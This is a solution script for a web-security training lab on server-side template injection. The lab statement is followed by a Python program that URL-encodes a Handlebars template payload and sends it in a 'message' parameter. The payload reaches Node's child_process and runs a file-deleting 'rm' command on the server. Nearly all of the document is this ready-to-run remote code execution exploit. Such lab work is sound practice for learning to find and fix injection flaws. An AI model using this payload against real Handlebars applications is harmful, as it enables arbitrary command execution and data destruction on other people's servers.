# Server-side template injection in an unknown language with a documented exploit

> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

```python
import requests
import sys
from urllib.parse import quote

# --- Configuration ---
# Lab: Server-side template injection in an unknown language (Handlebars)
# GOAL: Execute arbitrary system commands via Handlebars template injection
BASE_URL = "https://0ae000b80368896f81eab20500bc000f.web-security-academy.net/"

def exploit_handlebars_ssti(base_url):
    """
    Exploits a Node.js based Handlebars SSTI to execute system commands.
    """
    
    print(f"[*] Targeting: {base_url}")

    # The Raw Payload (Readable Format)
    # This specific payload exploits how Handlebars handles 'helpers' to access 
    # the 'child_process' module in Node.js.
    # We use 'rm' to delete the target file.
    command = "rm /home/carlos/morale.txt"
    
    raw_payload = f"""
    wrtz{{{{#with "s" as |string|}}}}
        {{{{#with "e"}}}}
            {{{{#with split as |conslist|}}}}
                {{{{this.pop}}}}
                {{{{this.push (lookup string.sub "constructor")}}}}
                {{{{this.pop}}}}
                {{{{#with string.split as |codelist|}}}}
                    {{{{this.pop}}}}
                    {{{{this.push "return require('child_process').exec('{command}');"}}}}
                    {{{{this.pop}}}}
                    {{{{#each conslist}}}}
                        {{{{#with (string.sub.apply 0 codelist)}}}}
                            {{{{this}}}}
                        {{{{/with}}}}
                    {{{{/each}}}}
                {{{{/with}}}}
            {{{{/with}}}}
        {{{{/with}}}}
    {{{{/with}}}}
    """

    # Clean up whitespace for transmission (optional, but good practice)
    # We strip the newlines to make it a compact injection
    clean_payload = "".join([line.strip() for line in raw_payload.split('\n')])

    # URL Encode the payload automatically
    encoded_payload = quote(clean_payload)
    
    # Construct the final URL
    # The lab expects the payload in the 'message' GET parameter
    full_url = f"{base_url}?message={encoded_payload}"
    
    print(f"[*] Sending malicious Handlebars payload...")
    
    # Send Request
    response = requests.get(full_url)
    
    # Verify
    if response.status_code == 200:
        print("[+] Request sent successfully (200 OK).")
        print("[+] Check the lab banner. If 'morale.txt' existed, it is now gone.")
    else:
        print(f"[-] Request failed with status: {response.status_code}")

if __name__ == "__main__":
    exploit_handlebars_ssti(BASE_URL)
```